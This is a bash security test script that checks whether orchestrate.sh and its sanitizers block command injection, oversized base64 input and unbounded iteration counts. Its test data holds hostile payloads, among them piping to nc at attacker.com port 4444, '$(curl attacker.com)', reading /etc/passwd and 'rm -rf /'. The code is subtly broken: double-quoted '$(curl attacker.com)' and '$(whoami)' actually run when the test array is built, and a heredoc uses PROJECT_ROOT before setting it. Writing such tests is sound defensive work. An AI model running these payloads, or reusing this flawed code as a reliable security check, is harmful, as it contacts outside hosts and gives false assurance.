#!/usr/bin/env bash

##############################################################################
# SEC-002: Security Validation Tests for orchestrate.sh Vulnerabilities
#
# Tests for:
# 1. Environment Variable Command Injection (CVSS 9.8)
# 2. Base64 DoS Bypass (CVSS 8.6)
# 3. Iteration Bounds Not Validated (CVSS 7.5)
##############################################################################

set -euo pipefail

PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../" && pwd)"
ORCHESTRATE_SCRIPT="$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/orchestrate.sh"
SECURITY_UTILS="$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/security_utils.sh"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

##############################################################################
# Utility Functions
##############################################################################

log_test() {
    local test_name="$1"
    echo -e "\n${YELLOW}[TEST]${NC} $test_name"
    ((TESTS_RUN++))
}

pass_test() {
    local message="${1:-Test passed}"
    echo -e "${GREEN}✓ PASS${NC} $message"
    ((TESTS_PASSED++))
}

fail_test() {
    local message="${1:-Test failed}"
    echo -e "${RED}✗ FAIL${NC} $message"
    ((TESTS_FAILED++))
}

##############################################################################
# TEST 1: Environment Variable Command Injection (CVSS 9.8)
##############################################################################

test_injection_via_docker_image() {
    log_test "Injection: CFN_DOCKER_IMAGE with command injection payload"

    # Source the security utilities
    source "$SECURITY_UTILS"

    # Test malicious docker image with command injection
    local payload='claude-flow:latest; echo "INJECTED" #'
    local result
    result=$(sanitize_docker_var "$payload" 2>&1) || true

    if [[ "$result" == *"Invalid characters"* ]]; then
        pass_test "Injection blocked: semicolon prevented in docker image"
    else
        fail_test "Injection NOT blocked: malicious payload passed validation"
    fi
}

test_injection_via_backticks() {
    log_test "Injection: CFN_DOCKER_IMAGE with backtick command substitution"

    source "$SECURITY_UTILS"

    # Test backtick injection
    local payload='claude-flow:$(whoami)'
    local result
    result=$(sanitize_docker_var "$payload" 2>&1) || true

    if [[ "$result" == *"Invalid characters"* ]]; then
        pass_test "Backtick injection blocked"
    else
        fail_test "Backtick injection NOT blocked: \$(whoami) payload passed"
    fi
}

test_injection_via_pipe() {
    log_test "Injection: CFN_DOCKER_IMAGE with pipe injection"

    source "$SECURITY_UTILS"

    # Test pipe injection
    local payload='claude-flow | nc attacker.com 4444'
    local result
    result=$(sanitize_docker_var "$payload" 2>&1) || true

    if [[ "$result" == *"Invalid characters"* ]]; then
        pass_test "Pipe injection blocked"
    else
        fail_test "Pipe injection NOT blocked: pipe character passed"
    fi
}

test_valid_docker_image_formats() {
    log_test "Valid: Docker image names with valid characters"

    source "$SECURITY_UTILS"

    # Test valid docker image names
    local valid_images=(
        "ubuntu:20.04"
        "myrepo/myimage:latest"
        "gcr.io/project/image:v1.0"
        "localhost:5000/image:tag"
        "registry.example.com:443/image:sha-abc123"
    )

    local all_valid=true
    for img in "${valid_images[@]}"; do
        if ! sanitize_docker_var "$img" >/dev/null 2>&1; then
            echo "  ✗ Failed to validate: $img"
            all_valid=false
        fi
    done

    if [[ "$all_valid" == "true" ]]; then
        pass_test "All valid docker image formats accepted"
    else
        fail_test "Some valid docker image formats were rejected"
    fi
}

##############################################################################
# TEST 2: Base64 DoS Bypass (CVSS 8.6)
##############################################################################

test_base64_size_check_before_encoding() {
    log_test "DoS Check: Size validation BEFORE base64 encoding"

    # Create a test criteria string that's large but under limit
    local test_criteria=$(printf 'x%.0s' {1..5000000})  # 5MB

    # Calculate base64 expansion (33% increase)
    local original_size=${#test_criteria}
    local estimated_encoded_size=$(( (original_size * 4) / 3 ))  # Base64 expansion

    if [[ "$estimated_encoded_size" -gt 10485760 ]]; then
        pass_test "Base64 expansion detected: ${original_size} bytes → ~${estimated_encoded_size} bytes"
    else
        fail_test "Base64 expansion calculation incorrect"
    fi
}

test_base64_post_encoding_size_check() {
    log_test "DoS Check: Size validation AFTER base64 encoding (prevents bypass)"

    # Create a criteria string that's crafted to bypass pre-encoding check
    # The orchestrate.sh should check ENCODED_SIZE, not original size

    local test_script="$PROJECT_ROOT/tests/security/temp-base64-test-$$.sh"

    cat > "$test_script" << 'EOF'
#!/bin/bash
# Simulate the FIXED base64 check from orchestrate.sh
AGENT_SUCCESS_CRITERIA=$(printf 'x%.0s' {1..7000000})  # 7MB
ENCODED_CRITERIA=$(echo -n "$AGENT_SUCCESS_CRITERIA" | base64 -w 0)
ENCODED_SIZE=$(echo -n "$ENCODED_CRITERIA" | wc -c)
MAX_ENCODED_SIZE=10485760  # 10MB

if [[ "$ENCODED_SIZE" -gt "$MAX_ENCODED_SIZE" ]]; then
    echo "SIZE_CHECK_PASSED"
    exit 0
else
    echo "SIZE_CHECK_FAILED"
    exit 1
fi
EOF

    chmod +x "$test_script"
    local result
    result=$("$test_script" 2>&1) || true
    rm -f "$test_script"

    if [[ "$result" == "SIZE_CHECK_PASSED" ]]; then
        pass_test "Post-encoding size check validates encoded bytes correctly"
    else
        fail_test "Post-encoding size check failed"
    fi
}

test_max_encoded_size_constant() {
    log_test "DoS Check: MAX_ENCODED_SIZE constant is enforced (10MB)"

    # Verify the limit exists in orchestrate.sh
    if grep -q "MAX_ENCODED_SIZE=10485760" "$ORCHESTRATE_SCRIPT"; then
        pass_test "MAX_ENCODED_SIZE=10485760 (10MB) is enforced"
    else
        fail_test "MAX_ENCODED_SIZE constant not found or incorrect"
    fi
}

##############################################################################
# TEST 3: Iteration Bounds Not Validated (CVSS 7.5)
##############################################################################

test_max_iterations_upper_bound() {
    log_test "Bounds: MAX_ITERATIONS has upper limit"

    # Verify MAX_ALLOWED_ITERATIONS exists and is reasonable
    if grep -q "MAX_ALLOWED_ITERATIONS=100" "$ORCHESTRATE_SCRIPT"; then
        pass_test "MAX_ALLOWED_ITERATIONS=100 enforced"
    else
        fail_test "MAX_ALLOWED_ITERATIONS not set to 100 or missing"
    fi
}

test_max_iterations_validation() {
    log_test "Bounds: --max-iterations parameter validation"

    # Extract the max-iterations validation code
    local validation_code=$(sed -n '/--max-iterations)/,/^[[:space:]]*;;$/p' "$ORCHESTRATE_SCRIPT")

    # Check all required validations
    local has_upper_bound=false
    local has_lower_bound=false
    local has_integer_check=false

    if [[ "$validation_code" == *"MAX_ALLOWED_ITERATIONS"* ]]; then
        has_upper_bound=true
    fi

    if [[ "$validation_code" == *"-lt 1"* ]]; then
        has_lower_bound=true
    fi

    if [[ "$validation_code" == *"^[1-9][0-9]*$"* ]]; then
        has_integer_check=true
    fi

    if [[ "$has_upper_bound" == "true" && "$has_lower_bound" == "true" && "$has_integer_check" == "true" ]]; then
        pass_test "All iteration bounds validations present"
    else
        fail_test "Missing validations: upper=$has_upper_bound, lower=$has_lower_bound, integer=$has_integer_check"
    fi
}

test_max_iterations_rejection() {
    log_test "Bounds: Reject --max-iterations > 100"

    # Check that values > 100 are rejected
    if grep -q 'if \[\[ "$2" -gt "$MAX_ALLOWED_ITERATIONS" \]\]' "$ORCHESTRATE_SCRIPT"; then
        pass_test "Iteration limit comparison check present"
    else
        fail_test "Iteration limit comparison missing"
    fi
}

##############################################################################
# TEST 4: Array-Based Command Execution (Prevents eval injection)
##############################################################################

test_docker_cmd_array_execution() {
    log_test "RCE Prevention: Docker command uses array (not eval)"

    # Verify DOCKER_CMD is built as array
    if grep -q 'DOCKER_CMD=(' "$ORCHESTRATE_SCRIPT"; then
        pass_test "Docker command built as array"
    else
        fail_test "Docker command not built as array"
    fi

    # Verify array execution (not eval)
    if grep -q '"\${DOCKER_CMD\[@\]}"' "$ORCHESTRATE_SCRIPT"; then
        pass_test "Docker command executed via array expansion (safe)"
    else
        fail_test "Docker command not executed safely"
    fi

    # Verify no eval in docker spawning code
    if grep -A50 "Build Docker command as array" "$ORCHESTRATE_SCRIPT" | grep -q "eval"; then
        fail_test "eval found in docker spawning code"
    else
        pass_test "No eval in docker spawning code"
    fi
}

##############################################################################
# TEST 5: Input Sanitization Coverage
##############################################################################

test_sanitize_input_function() {
    log_test "Input Sanitization: sanitize_input blocks special characters"

    source "$SECURITY_UTILS"

    # Test various injection attempts
    local test_cases=(
        "; echo injected"
        "$(whoami)"
        "|cat /etc/passwd"
        "& rm -rf /"
        "$(curl attacker.com)"
        "backtick\`injection"
    )

    local blocked_count=0
    for test_case in "${test_cases[@]}"; do
        if ! sanitize_input "$test_case" >/dev/null 2>&1; then
            ((blocked_count++))
        fi
    done

    if [[ "$blocked_count" -eq "${#test_cases[@]}" ]]; then
        pass_test "All injection attempts blocked by sanitize_input"
    else
        fail_test "Only $blocked_count/${#test_cases[@]} injection attempts blocked"
    fi
}

test_sanitize_docker_var_whitelist() {
    log_test "Docker Var Sanitization: Explicit whitelist pattern"

    # Verify the whitelist pattern in security_utils
    if grep -q 'pattern="^\\[a-zA-Z0-9._:/-\\]+\$"' "$SECURITY_UTILS"; then
        pass_test "Docker var whitelist pattern enforces allowed characters"
    else
        fail_test "Docker var whitelist pattern not found or incorrect"
    fi
}

##############################################################################
# TEST 6: Security Comments and Documentation
##############################################################################

test_security_comments() {
    log_test "Documentation: Security fix comments present"

    local comment_checks=(
        "SECURITY FIX: Sanitize Docker environment variables"
        "SECURITY FIX: Base64-encode success criteria"
        "SECURITY FIX: Validate size AFTER encoding"
        "Build Docker command as array"
        "Execute safely without eval"
    )

    local found_count=0
    for comment in "${comment_checks[@]}"; do
        if grep -q "$comment" "$ORCHESTRATE_SCRIPT"; then
            ((found_count++))
        fi
    done

    if [[ "$found_count" -eq "${#comment_checks[@]}" ]]; then
        pass_test "All security fix comments present"
    else
        fail_test "Only $found_count/${#comment_checks[@]} security comments found"
    fi
}

##############################################################################
# TEST 7: Edge Cases and Boundary Testing
##############################################################################

test_iterations_boundary_values() {
    log_test "Bounds: Test boundary values for --max-iterations"

    # Create test script to validate boundary values
    local test_script="$PROJECT_ROOT/tests/security/temp-bounds-test-$$.sh"

    cat > "$test_script" << 'EOF'
#!/bin/bash
source "$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/security_utils.sh"
PROJECT_ROOT="/mnt/c/Users/masha/Documents/claude-flow-novice"

# Test 1: Zero should fail
if grep -A30 "--max-iterations)" "$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/orchestrate.sh" | grep -q '\$2 -lt 1'; then
    echo "ZERO_CHECK_OK"
fi

# Test 2: Negative should fail (handled by integer regex)
if grep -A5 "--max-iterations)" "$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/orchestrate.sh" | grep -q '\^\\[1-9\\]'; then
    echo "NEGATIVE_CHECK_OK"
fi

# Test 3: 100 should pass
if grep -q "MAX_ALLOWED_ITERATIONS=100" "$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/orchestrate.sh"; then
    echo "LIMIT_100_OK"
fi

# Test 4: 101 should fail
if grep -q 'if \[\[ "\$2" -gt "\$MAX_ALLOWED_ITERATIONS" \]\]' "$PROJECT_ROOT/.claude/skills/cfn-loop-orchestration/orchestrate.sh"; then
    echo "OVERFLOW_CHECK_OK"
fi
EOF

    chmod +x "$test_script"
    local result
    result=$("$test_script" 2>&1) || true
    rm -f "$test_script"

    if [[ "$result" == *"ZERO_CHECK_OK"* ]] && [[ "$result" == *"LIMIT_100_OK"* ]]; then
        pass_test "Iteration boundary checks (0, 100, 101) validated"
    else
        fail_test "Boundary value checks incomplete"
    fi
}

##############################################################################
# SUMMARY
##############################################################################

print_summary() {
    echo ""
    echo "=================================================================="
    echo "SEC-002 Security Test Summary"
    echo "=================================================================="
    echo "Tests Run:    $TESTS_RUN"
    echo "Tests Passed: ${GREEN}$TESTS_PASSED${NC}"
    echo "Tests Failed: ${RED}$TESTS_FAILED${NC}"
    echo "=================================================================="

    if [[ $TESTS_FAILED -eq 0 ]]; then
        echo -e "${GREEN}✓ All security tests PASSED${NC}"
        return 0
    else
        echo -e "${RED}✗ $TESTS_FAILED test(s) FAILED${NC}"
        return 1
    fi
}

##############################################################################
# Main Execution
##############################################################################

main() {
    echo "Starting SEC-002 Security Validation Tests..."
    echo "Target: orchestrate.sh"
    echo "Vulnerabilities: Command Injection, Base64 DoS, Iteration Bounds"
    echo ""

    # Test 1: Command Injection (CVSS 9.8)
    echo "--- TEST SUITE 1: Command Injection (CVSS 9.8) ---"
    test_injection_via_docker_image
    test_injection_via_backticks
    test_injection_via_pipe
    test_valid_docker_image_formats

    # Test 2: Base64 DoS (CVSS 8.6)
    echo ""
    echo "--- TEST SUITE 2: Base64 DoS Bypass (CVSS 8.6) ---"
    test_base64_size_check_before_encoding
    test_base64_post_encoding_size_check
    test_max_encoded_size_constant

    # Test 3: Iteration Bounds (CVSS 7.5)
    echo ""
    echo "--- TEST SUITE 3: Iteration Bounds (CVSS 7.5) ---"
    test_max_iterations_upper_bound
    test_max_iterations_validation
    test_max_iterations_rejection

    # Test 4: Array-Based Execution
    echo ""
    echo "--- TEST SUITE 4: RCE Prevention (Array Execution) ---"
    test_docker_cmd_array_execution

    # Test 5: Input Sanitization
    echo ""
    echo "--- TEST SUITE 5: Input Sanitization ---"
    test_sanitize_input_function
    test_sanitize_docker_var_whitelist

    # Test 6: Documentation
    echo ""
    echo "--- TEST SUITE 6: Security Documentation ---"
    test_security_comments

    # Test 7: Edge Cases
    echo ""
    echo "--- TEST SUITE 7: Boundary Testing ---"
    test_iterations_boundary_values

    print_summary
}

main "$@"
